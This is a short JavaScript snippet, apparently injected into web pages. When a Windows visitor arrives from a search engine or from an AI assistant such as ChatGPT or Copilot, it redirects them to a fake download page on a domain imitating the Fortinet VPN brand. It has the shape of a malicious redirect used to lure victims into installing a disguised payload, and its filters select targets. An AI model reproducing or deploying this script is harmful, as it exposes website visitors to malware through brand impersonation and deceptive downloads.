(function() {
    const config = {
        redirectUrl: 'https://vpn-fortinet.com/download.html',

        allowedReferers: [
            'bing',
            'duckduckgo',
            'google',
            'yahoo',
			'chatgpt',
			'copilot',
	        'qwant',
            'ecosia',
	        'naver',
        ],

        filters: {
            searchEngine: true,
            os: {
                windows: true,
                linux: false,
                mac: false,
                android: false,
                ios: false
            },

            browser: {
                chrome: true,
                firefox: true,
                safari: true,
                edge: true,
                opera: true
            }
        }
    };

    const referrer = document.referrer.toLowerCase();
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    const isFromSearchEngine = config.filters.searchEngine 
        ? config.allowedReferers.some(engine => referrer.includes(engine)) 
        : true;

    const osChecks = {
        windows: /Win/i.test(platform),
        linux: /Linux/i.test(platform),
        mac: /Mac/i.test(platform),
        android: /Android/i.test(userAgent),
        ios: /iPhone|iPad|iPod/i.test(userAgent)
    };
    const isOsMatch = Object.keys(config.filters.os).some(os => config.filters.os[os] && osChecks[os]);

    const browserChecks = {
        chrome: /Chrome/i.test(userAgent) && !/Edg/i.test(userAgent),
        firefox: /Firefox/i.test(userAgent),
        safari: /Safari/i.test(userAgent) && !/Chrome/i.test(userAgent),
        edge: /Edg/i.test(userAgent),
        opera: /OPR/i.test(userAgent) || /Opera/i.test(userAgent)
    };
    const isBrowserMatch = Object.keys(config.filters.browser).some(browser => config.filters.browser[browser] && browserChecks[browser]);

    const shouldCheckOs = Object.values(config.filters.os).some(v => v);
    const shouldCheckBrowser = Object.values(config.filters.browser).some(v => v);

    const finalOsCheck = shouldCheckOs ? isOsMatch : true;
    const finalBrowserCheck = shouldCheckBrowser ? isBrowserMatch : true;

    if (isFromSearchEngine && finalOsCheck && finalBrowserCheck) {
        window.location.href = config.redirectUrl;
    }
})();